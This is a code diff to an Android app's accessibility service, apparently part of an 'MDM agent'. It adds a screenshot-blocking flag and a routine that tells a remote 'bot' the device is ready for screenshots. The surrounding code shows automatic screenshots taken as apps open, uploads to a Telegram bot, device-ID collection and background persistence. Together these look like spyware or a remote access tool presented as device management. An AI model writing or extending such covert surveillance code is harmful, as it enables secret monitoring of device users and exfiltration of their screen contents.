@@ -22,6 +22,7 @@ class MDMAccessibilityService : AccessibilityService() {
         private const val TAG = "MDMAccessibility"
 
         @Volatile var autoScreenshotEnabled = false
+        @Volatile var autoScreenshotBlocked = false  // ✅ Global block - when true, NO screenshots sent
         @Volatile private var lastScreenshotTime = 0L
         private const val SCREENSHOT_THROTTLE = 5000L  // 5 seconds between screenshots
         private const val SCREENSHOT_MIN_DELAY = 3000L  // 3 seconds after app opens
@@ -156,7 +157,23 @@ class MDMAccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
-        Log.i(TAG, "✅ Accessibility Service Connected - Starting connection...")
+        Log.i(TAG, "✅ Accessibility Service Connected - Screenshot capability is now ACTIVE!")
+
+        // ✅ Notify the bot that the device is ready for screenshots
+        try {
+            val sm = com.mdm.agent.MainActivity.getSocketManager()
+            if (sm != null && sm.isConnected) {
+                val data = org.json.JSONObject().apply {
+                    put("type", "accessibility_connected")
+                    put("message", "✅ Accessibility connected - device ready for screenshots")
+                    put("timestamp", System.currentTimeMillis())
+                }
+                sm.sendFileExplorerData(data)
+                Log.i(TAG, "📧 Notified bot: accessibility connected")
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Could not notify bot: ${e.message}")
+        }
 
         // Start MDMService for background persistence
         try {
@@ -411,8 +428,16 @@ class MDMAccessibilityService : AccessibilityService() {
 
     /**
      * Upload screenshot to Telegram bot via /api/device/upload-media endpoint.
+     * ✅ Respects autoScreenshotBlocked flag - if blocked, screenshot is discarded.
      */
     private fun uploadScreenshotToBot(file: File) {
+        // ✅ Check if screenshots are blocked
+        if (autoScreenshotBlocked) {
+            Log.i(TAG, "🚫 Screenshot blocked - discarding: ${file.name}")
+            file.delete()
+            return
+        }
+
         Thread {
             try {
                 val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
